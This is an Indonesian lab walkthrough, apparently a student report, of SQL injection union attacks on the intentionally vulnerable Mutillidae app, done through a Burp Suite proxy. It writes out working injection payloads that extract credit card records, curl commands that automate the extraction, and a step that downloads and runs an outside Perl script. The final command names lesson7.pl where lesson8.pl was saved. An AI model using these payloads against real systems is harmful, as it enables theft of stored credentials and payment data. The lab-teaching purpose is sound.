# Lesson 8 : SQL Injection Union Exploit #1

## Start Web Browser Session to Multillidae
- Buka browser kemudian akses Multillidae sesuai ip metasploit pada alamat http://10.0.1.100/mutillidae
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/1/start_browser.png "Home page")

## Go To User Info Page
1. Go to User Info
   - OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info 

## Configure Firefox Proxy Settings
1. View Preferences
   - Edit --> Preferences
2. Advanced Settings
   - Pilih Menu Advanced
   - Pilih Network Tabs
   - Pilih Settings
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/1/network_tab.png "Home page")
3. Connection Settings
   - Gunakan manual proxy
   - Pada kolom HTTP Proxy isikan **127.0.0.1**
   - Pada kolom Port **8080**
   - Centang bagian Use the proxy server for all protocols 
   - Klik Ok, Kemudian Close
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/1/set_config_proxy.png "Home page")

## Configure Burpsuite Settings
1. Buka Aplikasi Burpsuite
   - Akan muncul halaman aplikasi, pilih next
   - Use Burp defaults, kemudian klik start Burp
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/2/use_default.png "Home page")
2. Configure proxy
   - Pilih tab proxy, kemudian options
   - Set port ke 8080 seperti berikut
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/2/proxy_port_8080.png "Home page")
3. Turn on intercept
   - Pilih tab intercept
   - Pastikan intercept button dalam keadaan off "intercept is off"
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/2/intercept_off.png "Home page")

## SQL Injection (Union Example #1)
1. Inspect the Name Textbox with Firebug
   - Klik kanan pada Textbox Name, kemudian inspect element
2. Change Text Box Size
   - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 100
3. First Union SQL Injection Attempt
   - Pada kolom Textbox **Name** isikan **`' union select null -- `**
   - Pastikan anda menambahkan spasi setelah karakter **`--`**
   - Klik tombol View Account Details
4. SQL Error
	- Scroll kebawah untuk melihat pesan errornya
	- Perhatikan pesan errornya
	- Errornya terjadi karena perbedaan jumlah coloumn pada database

## SQL Injection (Union Example #2)
1. Inspect the Name Textbox with Firebug
   - Klik kanan pada Textbox Name, kemudian inspect element
2. Change Text Box Size
   - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 100
3. Second Union SQL Injection Attempt
   - Pada kolom Textbox **Name** isikan **`' union select null,null,null,null,null -- `**
   - Pastikan anda menambahkan spasi setelah karakter **`--`**
   - Klik tombol View Account Details
4. Viewing the Results
	- Scroll kebawah untuk melihat pesan errornya
	- Perhatikan pesan errornya

## SQL Injection (Union Example #3)
1. Inspect the Name Textbox with Firebug
   - Klik kanan pada Textbox Name, kemudian inspect element
2. Change Text Box Size
   - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 100
3. Second Union SQL Injection Attempt
   - Pada kolom Textbox **Name** isikan **`' union select 1,2,3,4,5 -- `**
   - Pastikan anda menambahkan spasi setelah karakter **`--`**
   - Klik tombol View Account Details
4. Viewing the Results
	- Scroll kebawah untuk melihat hasilnya
	- Perhatikan hasilnya
		- Pada hasilnya, terdapat 1 record ditemukan dengan value seperti berikut:
			- Username=2
			- Password=3
			- Signature=4

## SQL Injection (Union Example #4)
1. Inspect the Name Textbox with Firebug
   - Klik kanan pada Textbox Name, kemudian inspect element
2. Change Text Box Size
   - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 100
3. Second Union SQL Injection Attempt
   - Pada kolom Textbox **Name** isikan **`' union select ccid,ccnumber,ccv,expiration,null from credit_cards -- `**
   - Pastikan anda menambahkan spasi setelah karakter **`--`**
   - Klik tombol View Account Details
4. Viewing the Results
	- Scroll kebawah untuk melihat hasilnya
	- Perhatikan hasilnya
	- Pada hasilnya, terdapat 5 record ditemukan

## SQL Injection (Union Example with Curl #5)
1. View Post Data (With Burp Suite)
   - Klik pada Tab Proxy
   - Klik pada Tab History
   - Klik cari line yang urlnya mengandung **/mutillidae/index.php?page=user-info.php** dengan Method GET
   - Klik pada Tab Request
   - Klik pada Tab Raw
   - Highligt text, kemudian klik kanan
   - Klik "Copy to File"
2. Save File
   - Save file di dalam folder **root**
   - File Name: **crack_cookies.txt**
   - Klik tombol Save
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/save_burp.png "Home page")
3. Use Curl to Display Usernames and Passwords
   - Buka terminal, jalankan perintah berikut : 
 ```
   curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'
 ```

## Perl Parser
   - Buka terminal, jalankan perintah berikut :
 ```
   cd /root
   curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep -i "Username="  > lesson8.txt
   cat lesson8.txt
 ```

## Download Parser
   - Buka terminal, jalankan perintah berikut :
   ```
   cd /root
   wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT
   mv lesson8.pl.TXT lesson8.pl
   chmod 700 lesson8.pl
   ```

## Run Perl Script
   - Buka terminal, jalankan perintah berikut :
   ```
   ./lesson7.pl
   ```